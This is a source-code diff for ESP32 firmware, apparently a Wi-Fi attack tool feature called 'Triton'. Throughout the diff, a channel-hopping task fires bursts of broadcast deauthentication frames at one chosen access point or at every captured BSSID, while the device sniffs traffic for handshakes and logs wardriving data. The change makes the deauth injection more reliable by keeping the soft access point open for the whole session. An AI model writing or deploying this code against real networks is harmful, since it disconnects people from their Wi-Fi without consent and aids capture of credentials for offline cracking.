@@ -492,50 +492,36 @@ static void hop_task(void *)
 
         if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
-            /* 2.4 GHz attack window only. SoftAP per deauth phase
-             * (original proven pattern). During the 5 GHz window we
-             * skip this entirely so TX buffers aren't contested with
-             * the C5 commands firing below. */
-            bool ap_ok = (wifi_silent_ap_begin(s_ch) == ESP_OK);
-            if (ap_ok) {
-                if (s_mode == TM_SURGICAL) {
-                    int bursts = 8;
-                    for (int k = 0; k < bursts && s_alive; ++k) {
-                        int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
+            /* SoftAP is session-scoped (opened below in the initial
+             * setup, NOT here per-hop). Per-hop begin/end was calling
+             * WiFi.mode / softAP / softAPdisconnect at 1.5 s cadence,
+             * and eventually one of those mode transitions deadlocked
+             * the WiFi driver under concurrent buffer pressure. This
+             * fires the deauth bursts on whatever channel s_ch is
+             * currently pointing at (already set by the hop above). */
+            if (s_mode == TM_SURGICAL) {
+                int bursts = 8;
+                for (int k = 0; k < bursts && s_alive; ++k) {
+                    int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
+                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
+                    delay(5);
+                }
+            } else {
+                uint8_t bssids[BS_N][6];
+                int nb = 0;
+                portENTER_CRITICAL(&s_bs_mux);
+                int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
+                for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
+                nb = cap;
+                portEXIT_CRITICAL(&s_bs_mux);
+                int bursts = (s_mode == TM_STORM) ? 6 : 3;
+                for (int i = 0; i < nb && s_alive; ++i) {
+                    for (int k = 0; k < bursts; ++k) {
+                        int sent = wifi_deauth_broadcast(bssids[i], &seq);
                         s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                         delay(5);
                     }
-                } else {
-                    uint8_t bssids[BS_N][6];
-                    int nb = 0;
-                    portENTER_CRITICAL(&s_bs_mux);
-                    int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
-                    for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
-                    nb = cap;
-                    portEXIT_CRITICAL(&s_bs_mux);
-                    int bursts = (s_mode == TM_STORM) ? 6 : 3;
-                    for (int i = 0; i < nb && s_alive; ++i) {
-                        for (int k = 0; k < bursts; ++k) {
-                            int sent = wifi_deauth_broadcast(bssids[i], &seq);
-                            s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
-                            delay(5);
-                        }
-                    }
                 }
-                wifi_silent_ap_end();
-                /* silent_ap_end() disables promisc. Re-arm — but tighten
-                 * the hardware filter so we only see MGMT + DATA.
-                 * Dropping CTRL (ACKs / RTS / CTS) frees enough RX
-                 * buffer budget that concurrent softAP deauth TX +
-                 * ESP-NOW RX no longer hits NO_MEM as hard. */
-                wifi_promiscuous_filter_t f = {
-                    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
-                                   WIFI_PROMIS_FILTER_MASK_DATA
-                };
-                esp_wifi_set_promiscuous_filter(&f);
-                esp_wifi_set_promiscuous(true);
-                esp_wifi_set_promiscuous_rx_cb(cb);
-                esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
             }
         }
 
@@ -893,16 +879,21 @@ void feat_triton(void)
      * emit_hs check sats > 0 before writing a wardrive row. */
     gps_begin();
 
-    /* Tighten promisc filter — drop CTRL (ACK / RTS / CTS) to free
-     * RX buffer budget so the concurrent softAP deauth + ESP-NOW
-     * RX path doesn't keep returning NO_MEM. Software filter in cb()
-     * already ignores CTRL anyway. */
+    /* Session-scoped softAP. Opens ONCE here, stays up the whole Triton
+     * session, hop_task just channel-hops via esp_wifi_set_channel. The
+     * softAP is what makes esp_wifi_80211_tx(WIFI_IF_AP, ...) work — no
+     * AP interface means every deauth burst returns NO_MEM.
+     *
+     * silent_ap_begin internally sets APSTA mode, promiscuous filter,
+     * and the RX callback — we still override the filter afterwards to
+     * MGMT+DATA only (drops CTRL), which frees enough RX buffer budget
+     * for ESP-NOW + concurrent softAP TX to coexist. */
+    wifi_silent_ap_begin(1);
     wifi_promiscuous_filter_t filter = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                        WIFI_PROMIS_FILTER_MASK_DATA
     };
     esp_wifi_set_promiscuous_filter(&filter);
-    esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(cb);
     esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
 
@@ -1119,7 +1110,12 @@ void feat_triton(void)
     }
 
     s_alive = false;
+    /* Let hop_task finish its current iteration before we tear down
+     * the softAP — closing it while a deauth burst is mid-flight can
+     * leave the driver wedged. */
+    delay(100);
     esp_wifi_set_promiscuous(false);
+    wifi_silent_ap_end();
     if (s_file)     { s_file.flush();     s_file.close(); }
     if (s_wdr_file) { s_wdr_file.flush(); s_wdr_file.close(); }
     gps_end();
